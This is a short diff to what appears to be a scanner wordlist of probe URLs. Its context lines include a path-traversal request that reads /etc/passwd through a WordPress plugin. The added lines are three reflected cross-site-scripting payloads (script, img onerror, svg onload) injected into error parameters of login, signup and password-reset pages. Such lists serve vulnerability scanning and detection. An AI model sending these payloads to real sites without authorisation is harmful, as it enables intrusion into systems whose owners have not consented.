@@ -2141,3 +2141,6 @@
 /reset-password/?selector=test
 /wp-content/plugins/ioncube-tester-plus/readme.txt
 /wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
+/web/login?error=<script>alert(document.domain)</script>
+/web/signup?error=<img/src=x+onerror=alert(document.domain)>
+/web/reset_password?error=<svg/onload=alert(document.domain)>
